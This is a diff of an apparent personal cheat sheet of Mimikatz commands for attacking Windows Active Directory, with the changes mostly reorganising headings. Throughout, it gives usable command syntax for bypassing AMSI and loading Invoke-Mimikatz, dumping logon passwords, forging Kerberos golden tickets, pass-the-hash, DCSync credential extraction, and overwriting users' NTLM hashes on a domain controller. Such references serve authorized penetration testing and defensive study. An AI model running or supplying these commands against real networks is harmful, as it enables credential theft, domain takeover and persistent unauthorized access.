@@ -1,4 +1,5 @@
-# Add to PowerShell
+# PowerShell
+## Add to PowerShell
 - [Patch amsi.dll](https://github.com/okazymyrov/piki/blob/master/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
 ```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -20,9 +21,10 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 mimikatz "log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
 ```
 
-# Make a Golden ticket
+# kerberos
+## Make a Golden ticket
 ```console
-mimikatz "kerberos::golden /user:<username> /domain:<domain> /sid:<sid> /aes256:<aes256_hmac> /id:<user_id> /groups:<group_id> /startoffset:0 /endin:600 /renewmax:10080 /ticket:<user.domain.kirbi>" "exit"
+kerberos::golden /user:<username> /domain:<domain> /sid:<sid> /aes256:<aes256_hmac> /id:<user_id> /groups:<group_id> /startoffset:0 /endin:600 /renewmax:10080 /ticket:<user.domain.kirbi>
 ```
 
 SID can be found by [wmic](https://github.com/okazymyrov/piki/blob/master/wmic.md#get-sids-of-domains) or 
@@ -30,34 +32,42 @@ SID can be found by [wmic](https://github.com/okazymyrov/piki/blob/master/wmic.m
 whoami /all
 ```
 
-# Path-the-hash
+# sekurlsa
+## Path-the-hash
 ```console
-
-mimikatz "privilege::debug" "sekurlsa::pth /user:<user> /aes256:<aes256_hmac> /domain:<domain> /run:cmd.exe" "exit"
+privilege::debug
+sekurlsa::pth /user:<user> /aes256:<aes256_hmac> /domain:<domain> /run:cmd.exe
 ```
 
-# dcsync
+# lsadump
+
+## dcsync
 ```console
-mimikatz  "log" "lsadump::dcsync /domain:<domain>.local /user:<domain>\<user>" "exit"
+log <domain>.<user>.log
+lsadump::dcsync /domain:<domain>.local /user:<domain>\<user>
 ```
 
-# changentlm
-
+## changentlm
 > **Note**
 > While lsadump::setntlm seems to work multiple times for the same user account, this is not the case for lsadump::changentlm ([link](https://github.com/gentilkiwi/mimikatz/issues/201#issuecomment-483788010)).
  
-## Password string 
+### Password string 
 ```console
 lsadump::changentlm /server:<dc>.<domain>.local /user:<user> /oldntlm:<ntlm> /newpassword:<password>
 ```
-## NTLM
+### NTLM
 ```console
 lsadump::changentlm /server:<dc>.<domain>.local /user:<user> /oldntlm:<ntlm> /newntlm:<rc4>
 ```
 
-# setntlm
+## setntlm
 ```console
 lsadump::setntlm /server:<dc>.<domain>.local /user:<user> /ntlm:<ntlm>
 ```
 
+# token
+## elevate
+```console
+token::elevate [/user:<user>] [/process:<id>]
+```
 
